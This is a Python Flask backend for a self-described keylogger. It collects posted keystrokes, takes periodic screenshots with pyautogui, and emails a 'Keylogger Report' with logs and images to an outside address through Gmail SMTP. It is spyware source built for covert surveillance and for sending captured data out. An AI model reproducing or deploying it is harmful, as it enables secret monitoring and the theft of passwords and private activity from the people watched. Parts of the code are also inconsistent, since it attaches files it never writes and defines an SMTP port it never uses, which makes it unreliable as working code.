import threading
import time
import pyautogui
import smtplib
import os
import psycopg2
from dotenv import load_dotenv
from flask import Flask, jsonify, request
from flask_cors import CORS
from email.message import EmailMessage
import mimetypes


# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend communication

# Database connection
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASS"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_SENDER = os.getenv("SENDER_EMAIL")
EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")


# Monitoring Variables
monitoring = False
report_interval = 60
screenshot_interval = 30
keystroke_data = []


### **🟢 Start Monitoring API**
@app.route('/start_monitoring', methods=['POST'])
def start_monitoring():
    global monitoring
    if monitoring:
        return jsonify({'message': 'Monitoring already running'}), 400

    monitoring = True
    threading.Thread(target=monitor_activity, daemon=True).start()
    return jsonify({'message': 'Monitoring started'}), 200


### **🔴 Stop Monitoring API**
@app.route('/stop_monitoring', methods=['POST'])
def stop_monitoring():
    global monitoring
    monitoring = False
    return jsonify({'message': 'Monitoring stopped'}), 200


### **📌 Keystroke Logging Function**
@app.route('/log_keystroke', methods=['POST'])
def log_keystroke():
    data = request.get_json()
    if not data or 'user_id' not in data or 'key_text' not in data:
        return jsonify({'error': 'Invalid request'}), 400

    keystroke_data.append(f"{data['user_id']} typed: {data['key_text']}\n")
    return jsonify({'message': 'Keystroke logged successfully'}), 200


### **📸 Screenshot Capture Function**
def capture_screenshot():
    screenshot_path = f"screenshot_{int(time.time())}.png"
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path


def send_email_report():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Attach Keystroke Log (text file)
        log_filename = "keystrokes.txt"
        if os.path.exists(log_filename):
            with open(log_filename, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=log_filename)

        # Attach Latest Screenshot (image file)
        screenshot_filename = "latest_screenshot.png"
        if os.path.exists(screenshot_filename):
            with open(screenshot_filename, "rb") as f:
                msg.add_attachment(f.read(), maintype="image", subtype="png", filename=screenshot_filename)

        # Send the email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email Sent Successfully!")

    except Exception as e:
        print(f"❌ Email Error: {e}")


### **🔄 Background Monitoring Thread**
def monitor_activity():
    global monitoring
    last_report_time = time.time()
    while monitoring:
        time.sleep(5)  # Main loop delay

        # Take screenshots at intervals
        if time.time() - last_report_time >= screenshot_interval:
            capture_screenshot()
        
        # Send email report at intervals
        if time.time() - last_report_time >= report_interval:
            send_email_report()
            last_report_time = time.time()


if __name__ == "__main__":
    app.run(debug=True)
